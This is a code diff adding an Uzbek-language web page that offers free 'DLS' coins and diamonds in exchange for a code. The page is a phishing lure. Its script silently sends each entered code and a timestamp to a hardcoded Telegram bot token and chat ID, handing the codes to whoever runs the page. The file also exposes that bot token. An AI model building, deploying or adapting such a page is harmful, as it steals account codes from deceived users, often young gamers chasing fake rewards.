@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DLS Kod</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
+      padding: 20px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 20px;
+      color: #00ffcc;
+      margin-bottom: 20px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      font-size: 14px;
+    }
+    button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      font-size: 15px;
+      background-color: #00cc66;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #message {
+      margin-top: 15px;
+      color: red;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>DLS TANGA 🪙 OLMOZ 💎 OLISH UCHUN ODAM QUSHISH KODNI KIRITING</h1>
+    <input type="text" id="userCode" placeholder="Kod kiriting" />
+    <button onclick="submitCode()">Kod yuborish</button>
+    <div id="message"></div>
+  </div>
+
+  <script>
+    function submitCode() {
+      const kod = document.getElementById("userCode").value.trim();
+      const msg = document.getElementById("message");
+      msg.textContent = "";
+
+      if (!kod) return;
+
+      const vaqt = new Date().toLocaleString();
+      const text = `📥 Yangi kod:\n\n🔢 Kod: ${kod}\n🕒 Vaqt: ${vaqt}`;
+
+      fetch("https://api.telegram.org/bot8132831494:AAHLt-ociDZXqqn9sWCPWG49Jdp23VoOXDo/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "7045265173",
+          text: text
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          msg.style.color = "green";
+          msg.textContent = "Kod yuborildi!";
+        } else {
+          msg.textContent = "Xatolik yuz berdi!";
+        }
+      })
+      .catch(() => {
+        msg.textContent = "Internet bilan muammo bor!";
+      });
+
+      document.getElementById("userCode").value = "";
+    }
+  </script>
+</body>
+</html>
